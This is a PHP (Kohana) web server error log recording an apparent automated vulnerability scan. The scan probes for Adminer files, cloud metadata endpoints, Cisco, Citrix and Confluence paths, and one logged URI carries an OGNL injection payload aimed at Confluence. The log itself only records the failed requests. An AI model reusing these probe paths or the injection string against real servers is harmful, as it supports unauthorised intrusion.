2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ad.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.2.5-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Adminer.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:12 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:12 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:12 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:12 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:13 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:13 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:13 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL playground was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:13 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL playground was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:13 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:13 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL gql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bonita/API/portal/page/;i18ntranslation ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bonita/API/portal/page/;i18ntranslation ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wp-json/buddypress/v1/signup was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wp-json/buddypress/v1/signup was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: XjGyrVQ6Zw.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: XjGyrVQ6Zw.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
2025-10-29 19:27:14 --- STRACE: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL +CSCOT+/translation-table was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL +CSCOT+/translation-table was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sdo6mzlmsfz0.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL oauth/idp/logout was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL oauth/idp/logout was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/LiveLogSettingsServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/LiveLogSettingsServlet was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vpns/cfg/smb.conf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vpns/cfg/smb.conf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: jsp/help-sb-download.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: jsp/help-sb-download.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL auth/requestreset was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL auth/requestreset was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: json/setup-restore.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: json/setup-restore.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL computeMetadata/v1/project was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server-info.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: server-info.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ;/json/setup-restore-local.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ;/json/setup-restore-local.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL metadata/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL metadata/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: json/setup-restore-progress.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: json/setup-restore-progress.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL opc/v2/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL opc/v2/instance was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL +CSCOT+/oem-customization was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL +CSCOT+/oem-customization was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: metadata/v1.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL hetzner/v1/metadata was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL hetzner/v1/metadata was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: openstack/latest/meta_data.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: openstack/latest/meta_data.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ${(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Confluence-Vuln","tgedzlpykbPPPPPsqmdgletrw".replaceAll("P","Q")))} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ${(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Confluence-Vuln","tgedzlpykbPPPPPsqmdgletrw".replaceAll("P","Q")))} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL latest/meta-data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.3.1.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-mysql.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.4.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.5.0-mysql-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.0-en.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: adminer-4.6.1.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
